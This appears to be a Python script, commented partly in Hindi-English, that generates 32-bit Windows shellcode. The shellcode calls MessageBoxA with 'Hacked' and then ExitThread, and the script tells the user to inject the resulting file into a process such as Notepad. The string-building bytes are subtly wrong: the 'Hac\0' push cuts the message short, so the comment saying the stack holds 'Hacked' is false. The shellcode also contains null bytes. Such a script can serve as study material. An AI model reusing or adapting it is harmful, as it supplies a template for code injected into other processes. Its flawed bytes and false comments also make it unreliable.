import ctypes
import struct
import os

def generate_message_payload():
    print("[*] Generating Message Box Payload...")

    # --- SAFETY CHECK: Architecture ---
    if struct.calcsize("P") * 8 != 32:
        print("[-] ERROR: You are running 64-bit Python.")
        print("    Please run this script with Python 32-bit (x86).")
        return

    try:
        # 1. Load DLLs
        k32 = ctypes.windll.kernel32
        user32 = ctypes.windll.user32 # Message box ke liye User32 chahiye

        # 2. Fetch Live Addresses
        # MessageBoxA: Text show karne ke liye
        msgbox_addr = ctypes.cast(user32.MessageBoxA, ctypes.c_void_p).value
        # ExitThread: Crash se bachane ke liye
        exitthread_addr = ctypes.cast(k32.ExitThread, ctypes.c_void_p).value

        print(f"[+] MessageBoxA Address: {hex(msgbox_addr)}")
        print(f"[+] ExitThread Address:  {hex(exitthread_addr)}")

        # 3. Pack Addresses (Little Endian)
        msgbox_bytes = struct.pack("<I", msgbox_addr)
        exitthread_bytes = struct.pack("<I", exitthread_addr)

    except Exception as e:
        print(f"[-] Error fetching addresses: {e}")
        return

    # 4. Build Shellcode (x86)
    shellcode = bytearray()

    # --- PART 1: Prepare Strings ("Hacked" and "Hello") ---
    
    # String 1: "Hacked" (Message Content)
    shellcode += bytearray([
        0x31, 0xC0,             # XOR EAX, EAX (Zero)
        0x50,                   # PUSH EAX (Null Terminator)
        0x68, 0x6B, 0x65, 0x64, 0x00, # PUSH "ked\0"
        0x68, 0x48, 0x61, 0x63, 0x00, # PUSH "Hac\0" -> Stack ban gaya "Hacked"
        0x89, 0xE1,             # MOV ECX, ESP (Save pointer to "Hacked" in ECX)
    ])

    # String 2: "Info" (Title Bar)
    shellcode += bytearray([
        0x50,                   # PUSH EAX (Null Terminator)
        0x68, 0x49, 0x6E, 0x66, 0x6F, # PUSH "Info"
        0x89, 0xE2,             # MOV EDX, ESP (Save pointer to "Info" in EDX)
    ])

    # --- PART 2: Call MessageBoxA ---
    # MessageBoxA(NULL, "Hacked", "Info", 0)
    shellcode += bytearray([
        0x6A, 0x00,             # PUSH 0 (MB_OK button)
        0x52,                   # PUSH EDX (Title "Info")
        0x51,                   # PUSH ECX (Message "Hacked")
        0x6A, 0x00,             # PUSH 0 (Window Handle NULL)
        0xB8                    # MOV EAX, <ADDRESS>
    ])
    shellcode += msgbox_bytes   # Add dynamic MessageBox address
    shellcode += bytearray([0xFF, 0xD0]) # CALL EAX

    # --- PART 3: ExitThread(0) ---
    shellcode += bytearray([
        0x31, 0xC0,             # XOR EAX, EAX
        0x50,                   # PUSH EAX (ExitCode 0)
        0xB8                    # MOV EAX, <ADDRESS>
    ])
    shellcode += exitthread_bytes # Add dynamic ExitThread address
    shellcode += bytearray([0xFF, 0xD0]) # CALL EAX

    # 5. Save File
    filename = "msg_payload.bin"
    with open(filename, "wb") as f:
        f.write(shellcode)

    print("-" * 30)
    print(f"[SUCCESS] {filename} created.")
    print(f"[INFO] Inject this into a 32-bit app (like Notepad) to see the text.")

if __name__ == "__main__":
    generate_message_payload()